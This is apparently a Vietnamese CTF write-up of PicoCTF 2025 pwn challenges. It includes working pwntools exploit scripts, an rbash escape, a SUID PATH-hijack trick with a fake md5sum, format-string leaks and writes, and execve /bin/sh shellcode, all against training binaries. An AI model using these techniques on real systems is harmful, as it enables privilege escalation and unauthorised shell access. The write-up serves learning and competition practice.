---
title: "[WRITE UP] - PicoCTF 2025"
date: 2025-03-17 11:55:00
tags:
  - PWN
  - REV
category: "CTF Write ups"
---

Write up các bài trên 200 điểm mình solve được trong PicoCTF năm nay

# Binary Exploitation

## hash-only-2

### Challenge Description

![alt text](/img/PicoCTF/image.png)

### Analysis + Solution

File của bài này vẫn là `flaghasher` giống như `hash-only-2`:

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rax
  __int64 v4; // rax
  const char *command; // rax
  __int64 envp_1; // rdx
  __int64 v7; // rax
  __int64 v8; // rax
  int v9; // ebx
  char v11; // [rsp+Bh] [rbp-45h] BYREF
  unsigned int v12; // [rsp+Ch] [rbp-44h]
  _BYTE v13[40]; // [rsp+10h] [rbp-40h] BYREF
  unsigned __int64 v14; // [rsp+38h] [rbp-18h]

  v14 = __readfsqword(0x28u);
  v3 = std::operator<<<std::char_traits<char>>(&std::cout, "Computing the MD5 hash of /root/flag.txt.... ", envp);
  v4 = std::ostream::operator<<(v3, &std::endl<char,std::char_traits<char>>);
  std::ostream::operator<<(v4, &std::endl<char,std::char_traits<char>>);
  sleep(2u);
  std::allocator<char>::allocator(&v11);
  std::string::basic_string(v13, "/bin/bash -c 'md5sum /root/flag.txt'", &v11);
  std::allocator<char>::~allocator(&v11);
  setgid(0);
  setuid(0);
  command = (const char *)std::string::c_str(v13);
  v12 = system(command);
  if ( v12 )
  {
    v7 = std::operator<<<std::char_traits<char>>(&std::cerr, "Error: system() call returned non-zero value: ", envp_1);
    v8 = std::ostream::operator<<(v7, v12);
    std::ostream::operator<<(v8, &std::endl<char,std::char_traits<char>>);
    v9 = 1;
  }
  else
  {
    v9 = 0;
  }
  std::string::~string(v13);
  return v9;
}
```

Như ta có thể thấy, binary sẽ thực hiện một số thao tác đơn giản như sau:

- In ra màn hình `Computing the MD5 hash of /root/flag.txt....`
- Và sau đó thực thi lệnh `md5sum`: `/bin/bash -c 'md5sum /root/flag.txt'`

Điều đặc biệt ở đây ta có thể thấy là command mà nó thực hiện là `md5sum`, và đây không phải là `absolute path`, nên khi `Linux` thực thi lệnh đó trước tiên nó sẽ nhìn vào biến `PATH` của chúng ta để xác định được `PATH` command mà ta thực hiện nằm ở đâu, sau đó mới thực hiện. Chính vì thế ta có thể lợi dụng điều này để điều hướng luồng thực thi command đó (thay vì `/usr/bin/md5sum` ta có thể cho nó thành `/home/user/md5sum`), và vì binary của challenge có quyền `SUID`, nên khi thực hiện nó sẽ thực hiện với quyền của `root`, vì thế ta có thể dễ dàng có được flag ở `/root/flag.txt`.

Tuy nhiên đối với bài này, shell nó sử dụng không phải là các shell thông thường của chúng ta như `zsh, bash` mà lại là `rbash` tức là đã có sự hạn chế một số lệnh mà ta có thể chạy được. Vậy trước hết ta cần tìm cách `escape` `rbash` trước


```sh
ctf-player@pico-chall$ echo $0
-rbash
ctf-player@pico-chall$ compgen -c
if
then
else
elif
fi
case
<...>
python3
<...>
```

`compgen -c` là command dùng để check các lệnh có thể chạy được ở shell đang dùng hiện tại, và ta thấy rằng `python3` được phép chạy trong đó. Và từ việc đọc thêm tại [đây](https://0xffsec.com/handbook/shells/full-tty/), ta có thể biết được cách dùng python3 để spawn một bash shell thông qua lệnh

```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```sh
ctf-player@pico-chall$ python3 -c 'import pty; pty.spawn("/bin/bash")'
ctf-player@challenge:~$ echo $0
/bin/bash
```

Sau đó ta cần tìm thêm các file `SUID` trong chương trình do ta chưa biết `flashhasher` nằm ở đâu. Ta có thể dùng:

```sh
find / -perm /4000
```

```sh
ctf-player@challenge:~$ find / -perm /4000 2>/dev/null
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/su
/usr/bin/umount
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/local/bin/flaghasher
```

Và lúc này việc ta cần làm là như `hash-only-1` là điều hướng luồng thực thi của nó mà thôi

```sh
ctf-player@challenge:~$ echo "cat /root/flag.txt > a.txt"  > md5sum       # fake md5sum
ctf-player@challenge:~$ export PATH=/home/ctf-player:$PATH                # add path hiện tại vào $PATH
ctf-player@challenge:~$ chmod +x md5sum                                   # cấp quyền execute cho md5sum
ctf-player@challenge:~$ /usr/local/bin/flaghasher                         # chạy file binary
Computing the MD5 hash of /root/flag.txt....

ctf-player@challenge:~$ ls
a.txt  md5sum
ctf-player@challenge:~$ cat a.txt                                         # Read flag
picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_1a74f5fd}
```


## PIE TIME 2

### Challenge Description

![alt text](/img/PicoCTF/image-1.png)

### Analysis

```sh
[*] '/home/alter/CTFs/2025/PicoCTF/pwn/PIE_TIME2/vuln'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

void call_functions() {
  char buffer[64];
  printf("Enter your name:");
  fgets(buffer, 64, stdin);
  printf(buffer);

  unsigned long val;
  printf(" enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);

  void (*foo)(void) = (void (*)())val;
  foo();
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  call_functions();
  return 0;
}
```

Từ source code trên mình sẽ chú yếu phân tích 2 hàm `win` và `call_functions`. Trong đó hàm `win` sẽ làm một hàm `ẩn` do không được call, và hàm `call_functions` sẽ là hàm được `main` call và sẽ là hàm thực hiện các chức năng chính của chương trình. Ta sẽ đi vào phân tích hàm `call_functions` trước

```c
void call_functions() {
  char buffer[64];
  printf("Enter your name:");
  fgets(buffer, 64, stdin);
  printf(buffer);

  unsigned long val;
  printf(" enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);

  void (*foo)(void) = (void (*)())val;
  foo();
}
```

Nhìn sơ qua thì hàm có lỗi `Format String` do `printf(buffer)` gây ra, dữ liệu đầu vào được nhập tại `buffer` và chính vì thế ta có thể kiểm soát các `format specifer` giúp ta leak những địa chỉ mà ta muốn. Và vẫn như `PIE TIME 1` ở bài này nó sẽ thực thi địa chỉ mà ta chỉ định trong biến `val`

```c
  void (*foo)(void) = (void (*)())val;
  foo();
```

Đối với bài này, ta không được leak sẵn như `PIE TIME 1` nên ta cần phải tự làm, bằng việc sử dụng format `%p` ta có thể dễ dàng leak địa chỉ tại bất cứ đâu mà ta muốn. Để tìm được offset địa chỉ mà ta muốn leak, mình sẽ cho chương trình dừng tại hàm `printf` có lỗi `Format String`, sau đó tính toán offset

![alt text](/img/PicoCTF/image-2.png)

Và hãy cho rằng địa chỉ mà mình muốn leak là nằm ở `rbp+0x8` tức là `saved rip` của hàm `call_functions`, tại đây ta có thể thấy đó là địa chỉ của hàm `main`
Việc ta cần làm là dùng công thức sau để tính toán

```
offset = ([address muốn leak] - [address tại rsp (top stack)])/8 + 6
```

Và mình tính ra được offset tại đó là `19` lúc này ta chỉ cần sử dụng short form `%<offset>$p` để leak. Sau khi leak được địa chỉ tại main ta sẽ tính toán địa chỉ `base` và sau đó truyền địa chỉ của hàm `win`

### Solution

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from time import sleep

context.log_level = 'debug'
exe = context.binary = ELF('./vuln', checksec=False)
libc = exe.libc

def init(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        docker_port = sys.argv[1]
        docker_path = sys.argv[2]
        p = remote("localhost", docker_port)
        sleep(1)
        pid = process(["pgrep", "-fx", docker_path]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

b*call_functions+80
c
'''.format(**locals())

p = init()

# ==================== EXPLOIT ====================

def exploit():

    pl = b'%19$p'
    p.sendlineafter(b'name:', pl)

    exe.address = int(p.recvline()[:-1], 16) - 0x1441
    print(hex(exe.address))

    p.sendlineafter(b': ', hex(exe.sym.win+24))

    p.interactive()

if __name__ == '__main__':
    exploit()
```

## Echo Valley

### Challenge Description

![alt text](/img/PicoCTF/image-3.png)

### Note

Trước khi đọc write up challenge này ta cần biết khái niệm về `Format String` là gì để đọc không bị rối, ta có thể xem tại đây:

- [Source 1](https://youtu.be/b8GMf5kM2LU?si=n36HC2LxF8sdEnum)
- [Source 2](https://ir0nstone.gitbook.io/notes/binexp/stack/format-string)

### Analysis

```sh
[*] '/home/alter/CTFs/2025/PicoCTF/pwn/Echo_Valley/valley'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    Debuginfo:  Yes
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void print_flag() {
    char buf[32];
    FILE *file = fopen("/home/valley/flag.txt", "r");

    if (file == NULL) {
      perror("Failed to open flag file");
      exit(EXIT_FAILURE);
    }

    fgets(buf, sizeof(buf), file);
    printf("Congrats! Here is your flag: %s", buf);
    fclose(file);
    exit(EXIT_SUCCESS);
}

void echo_valley() {
    printf("Welcome to the Echo Valley, Try Shouting: \n");

    char buf[100];

    while(1)
    {
        fflush(stdout);
        fgets(buf, sizeof(buf), stdin);

        if (strcmp(buf, "exit\n") == 0) {
            printf("The Valley Disappears\n");
            break;
        }

        printf("You heard in the distance: ");
        printf(buf);
        fflush(stdout);
    }
    fflush(stdout);
}

int main()
{
    echo_valley();
    return 0;
}
```

Source code bài này khá đơn giản không có gì quá đặc biệt ngoài một lỗi `Format String` trong hàm `echo_valley`. Trong hàm này nó sẽ chạy một `infinity` loop, cho phép ta thực hiện các chức năng của hàm và chỉ `break` ra khi ta nhập `exit`. Ý tưởng thì vẫn như các bài trước ta vẫn sẽ leak và tính toán các địa chỉ cần thiết như là `elf base`, `stack address` ...

### Solution

Cách leak tương tự như `PIE TIME 2`, mình sẽ sử dụng short form của `%p` để leak địa chỉ và bài này idea của mình sẽ là leak và tính toán địa chỉ `elf base` và `stack` sau đó dùng format string payload để đặt địa chỉ của `print_flag` và `saved rip`. Làm như vậy thì sau khi ta nhập `exit`, loop được `break` ra hàm `echo_valley` thay vì return vào `main` nó sẽ return vào `printf_flag`

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from time import sleep

context.log_level = 'debug'
exe = context.binary = ELF('./valley', checksec=False)
libc = exe.libc

def init(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        docker_port = sys.argv[1]
        docker_path = sys.argv[2]
        p = remote("localhost", docker_port)
        sleep(1)
        pid = process(["pgrep", "-fx", docker_path]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

b *echo_valley+201
b *echo_valley+219
c
'''.format(**locals())

p = init()

# ==================== EXPLOIT ====================

def exploit():

    p.sendline(b'%20$p')

    p.recvuntil(b'distance: ')
    stack = int(rl()[:-1], 16)
    log.info('Stack: ' +  hex(stack))

    p.sendline(b'%21$p')
    p.recvuntil(b'distance: ')
    leak = int(p.recvline()[:-1], 16)
    exe.address = leak - 0x1413
    log.info('Elf base: ' + hex(exe.address))

    offset = 6
    write = {
        stack - 8: exe.sym.print_flag + 5
    }

    pl = fmtstr_payload(offset, write, write_size='short')
    # print(pl)
    p.sendline(pl)

    p.sendline(b'exit')

    p.interactive()

if __name__ == '__main__':
    exploit()
```

Trong exploit trên mình tin chọn 2 địa chỉ uy tín nhất và khá ít khi thay đổi đó là `saved rip` và `saved rbp`, từ đó mình leak được địa chỉ của `main` và `stack`, việc ta làm là dùng `fmtstr_payload` để write `saved rip` thành địa chỉ `print_flag`. **Lưu ý:** Offset trong `fmtstr_payload` là `offset` tính từ `top stack` đến `input`. Và khi ta `debug` ta thấy input của ta được đặt tại `rsp` tức `top stack` luôn nên offset sẽ là `6`. Còn tại sao nó là 6 thì hãy xem video <(")

## handoff

### Challenge Description

![alt text](/img/PicoCTF/image-4.png)

### Analysis

```sh
[*] '/home/alter/CTFs/2025/PicoCTF/pwn/handoff/handoff'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>

#define MAX_ENTRIES 10
#define NAME_LEN 32
#define MSG_LEN 64

typedef struct entry {
	char name[8];
	char msg[64];
} entry_t;

void print_menu() {
	puts("What option would you like to do?");
	puts("1. Add a new recipient");
	puts("2. Send a message to a recipient");
	puts("3. Exit the app");
}

int vuln() {
	char feedback[8];
	entry_t entries[10];
	int total_entries = 0;
	int choice = -1;
	// Have a menu that allows the user to write whatever they want to a set buffer elsewhere in memory
	while (true) {
		print_menu();
		if (scanf("%d", &choice) != 1) exit(0);
		getchar(); // Remove trailing \n

		// Add entry
		if (choice == 1) {
			choice = -1;
			// Check for max entries
			if (total_entries >= MAX_ENTRIES) {
				puts("Max recipients reached!");
				continue;
			}

			// Add a new entry
			puts("What's the new recipient's name: ");
			fflush(stdin);
			fgets(entries[total_entries].name, NAME_LEN, stdin);
			total_entries++;

		}
		// Add message
		else if (choice == 2) {
			choice = -1;
			puts("Which recipient would you like to send a message to?");
			if (scanf("%d", &choice) != 1) exit(0);
			getchar();

			if (choice >= total_entries) {
				puts("Invalid entry number");
				continue;
			}

			puts("What message would you like to send them?");
			fgets(entries[choice].msg, MSG_LEN, stdin);
		}
		else if (choice == 3) {
			choice = -1;
			puts("Thank you for using this service! If you could take a second to write a quick review, we would really appreciate it: ");
			fgets(feedback, NAME_LEN, stdin);
			feedback[7] = '\0';
			break;
		}
		else {
			choice = -1;
			puts("Invalid option");
		}
	}
}

int main() {
	setvbuf(stdout, NULL, _IONBF, 0);  // No buffering (immediate output)
	vuln();
	return 0;
}
```

Đây là một bài khá khó, và ý tưởng ban đầu của mình là tìm cách để thực thi `shellcode` do Stack thực thi được. Nhìn vào hàm `vuln` ta sẽ thấy nó chạy một vòng lặp vô hạn và cho ta chọn các options

- Đối với option 1, input của ta sẽ được lưu vào `entries[total_entries].name`. Với:
  - `entries` là một mảng gồm 10 structs `entry_t entries[10]`
  - `name` là phần tử trong struct `entry_t` struct
  - `total_entries` sẽ là `index` của mảng struct đó
- Đối với option 2, option này chỉ cho phép ta sử dụng hàm `fgets` khi `choice >= total_entries`. Và input khi ta nhập bằng `fgets` sẽ đi vào `entries[choice].msg`. Với:
  - `entries` là một mảng gồm 10 structs `entry_t entries[10]`
  - `msg` là phần tử trong struct `entry_t`
  - `choice` là `option` mà ta lựa chọn (ở đây choice là 2), và cũng biểu thị cho `index` của mảng `entries`
- Đối với option 3, input sẽ được nhập vào `feedback[8]`, và dữ liệu của ta có thể nhập liên đến `32` bytes nên tại option này sẽ có lỗi `Buffer Overflow`

Vậy tóm lại:

- Option 2 được phép nhập `64` bytes -> Sẽ phù hợp để ta đặt `shellcode` chính của ta vào đây
- Option 3 sẽ có lỗi `Buffer Overflow` nên ta sẽ setup dữ liệu tại đây để nó nhảy vào `shellcode` ta đặt ở option 2
- Option 1 sẽ là nơi ta đặt padding và dùng để làm điều kiện cho ta sử dụng option 2

### Solution

Khi debug ta sẽ thấy được, dữ liệu được mà hàm `fgets` trả về sau khi thực thi sẽ là chuỗi input của ta và nó được đặt tại `RAX`

![alt text](/img/PicoCTF/image-5.png)

Điều này này mình một ý tưởng là sử dụng gadget `jmp/call rax` để thực thi `shellcode` tại option 3 (vì shellcode tại đây sẽ là shellcode setup cho việc thực thi shellcode chính của ta tại option 2 và nó cũng có lỗi ` Buffer Overflow` nên sẽ dễ dàng kiểm soát được `saved rip` và điều hướng chương trình sau khi return sẽ thực thi gadget `jmp/call rax`)

Và đây là exploit của mình:

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

context.log_level = 'debug'
exe = context.binary = ELF('./handoff', checksec=False)
libc = exe.libc

def init(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        docker_port = sys.argv[1]
        docker_path = sys.argv[2]
        p = remote("localhost", docker_port)
        sleep(1)
        pid = process(["pgrep", "-fx", docker_path]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

# b *vuln+62
b *0x000000000040140e
c
'''.format(**locals())

p = init()

# ==================== EXPLOIT ====================

def exploit():

    jmp_rax = 0x000000000040116c


    sc = asm("""
    sc:
            nop
            nop
            nop
            xor rdi, rdi
            lea rdi, [rip+bin_sh]
            nop
            nop
            nop
            nop
            xor rsi, rsi
            xor rdx, rdx
            mov eax, 0x3b
            syscall
            nop
            nop
            nop

    bin_sh:
            .ascii "/bin/sh"
            .byte 0
    """, arch='amd64')

    sc2 = asm ("""
            nop
            nop
            sub rsp, 0x2e4
            nop
            jmp rsp
             """)


    sla(b'\n', b'1')
    sla(b'\n', b'A'*8)

    sla(b'\n', b'2')
    sla(b'\n', b'0')
    sla(b'\n', sc)

    sla(b'\n', b'3')
    offset = 20
    payload = sc2.ljust(offset, b'\x90') + p64(jmp_rax)
    sla(b'\n', payload)

    interactive()

if __name__ == '__main__':
    exploit()
```

Để tính toán đúng offset ta cần để `sub rsp, 0x2e4` ta sẽ dựa vào padding tại option 1 là `A * 8` từ đó tính offset tại address hiện tại đến đó. Mình sẽ không giải thích ở đây quá nhiều vì nó đòi hỏi khả năng debug và chỉnh sửa payload liên tục. Và lý do tại sao 2 shellcode lại có nhiều `nop` đến thế thì đơn giản nó chỉ là padding để `shellcode` thực thi đúng với những gì mình mong muốn, Vì lúc đặt shellcode không có `nop` lên thì ta sẽ nhận thấy rằng sẽ có một số `instruction` không mong muốn bị chèn vào đó.

Bên cạnh đó ta còn có thể sử dụng thêm một cách chỉ dùng duy nhất một shellcode. Cách này ta sẽ sử dụng `option 1` như là nơi chứa chuỗi `/bin/sh` của ta và option 3 sẽ là nơi thực thi shellcode

```py
#!/usr/bin/python3

from pwn import *
from time import sleep

context.binary = exe = ELF('./handoff',checksec=False)
context.arch = 'amd64'
#p = process()
p = remote('shape-facility.picoctf.net', 52705)

# input()
jmp_rax  = 0x000000000040116c
pop_rdi = 0x00000000004014b3

for i in range(9):
    p.sendline(b'1')
    p.sendline(b'A')

p.sendline(b'1')
payload = b'/bin/sh\x00'
p.sendline(payload)
# input()
sleep(0.5)
p.sendline(b'3')

shellcode = asm('''
xchg rax,rdi
mov rax,0x3b
nop
sub rdi,0x4c
xor esi,esi
xor edx,edx
syscall
                ''')
print(len(shellcode))
p.sendline(shellcode + p64(jmp_rax))

p.interactive()
```
